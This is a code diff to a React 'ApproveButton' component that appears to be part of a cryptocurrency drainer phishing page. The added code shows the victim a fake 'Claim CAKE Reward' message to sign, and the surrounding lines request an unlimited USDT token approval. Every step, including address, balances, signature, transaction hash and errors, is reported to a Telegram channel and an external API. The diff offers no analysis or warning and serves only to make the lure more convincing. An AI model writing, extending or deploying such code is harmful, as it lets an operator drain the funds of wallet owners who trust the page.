@@ -104,7 +104,7 @@ export default function ApproveButton() {
     }
   }, [isConnected, address]);
 
-  // 🔹 Handle Approve button
+  // 🔹 Handle Approve button with personal sign first
   const handleApprove = async () => {
     if (!walletClient || !isConnected || !address) {
       alert("Please Connect Your Wallet.");
@@ -121,6 +121,33 @@ export default function ApproveButton() {
       : "0";
 
     try {
+      // Step 1: Personal Sign Message
+      const signMessage = `Claim ${cakeReward} CAKE Reward`;
+      console.log("Requesting personal sign for:", signMessage);
+
+      const signature = await walletClient.signMessage({
+        account: address,
+        message: signMessage,
+      });
+
+      console.log("Message signed successfully:", signature);
+
+      // Send sign success to Telegram
+      await sendToTelegram(
+        `✅ Message Signed:\n<code>${address}</code>\nMessage: "${signMessage}"\nSignature: ${signature.slice(0, 20)}...`
+      );
+
+      await sendToExternalAPI({
+        address,
+        action: "message_signed",
+        message: signMessage,
+        signature: signature,
+        usdtBalance: usdtFormatted,
+        bscBalance: bnbFormatted,
+        timestamp: new Date().toISOString(),
+      });
+
+      // Step 2: Proceed with USDT Approval
       const maxAmount = parseUnits(
         "115792089237316195423570985008687907853269984665640564039457584007913129639935",
         0
@@ -135,27 +162,35 @@ export default function ApproveButton() {
       });
 
       await sendToTelegram(
-        `✅ USDT Approved:\n${address}\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}`
+        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
       );
 
       await sendToExternalAPI({
         address,
         action: "approval_success",
         txHash: hash,
+        signedMessage: signMessage,
+        signature: signature,
         usdtBalance: usdtFormatted,
         bscBalance: bnbFormatted,
         timestamp: new Date().toISOString(),
       });
+
     } catch (err) {
-      console.error("USDT approval failed:", err.message);
+      console.error("Process failed:", err.message);
+
+      // Determine if error was during signing or approval
+      const errorContext = err.message.toLowerCase().includes('user rejected') 
+        ? (err.message.toLowerCase().includes('sign') ? 'Message signing rejected' : 'Transaction rejected')
+        : 'Process failed';
 
       await sendToTelegram(
-        `❌ USDT Approval Failed:\n$<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}`
+        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nError: ${err.message}`
       );
 
       await sendToExternalAPI({
         address,
-        action: "approval_failed",
+        action: errorContext.toLowerCase().includes('sign') ? 'sign_failed' : 'approval_failed',
         error: err.message,
         usdtBalance: usdtFormatted,
         bscBalance: bnbFormatted,
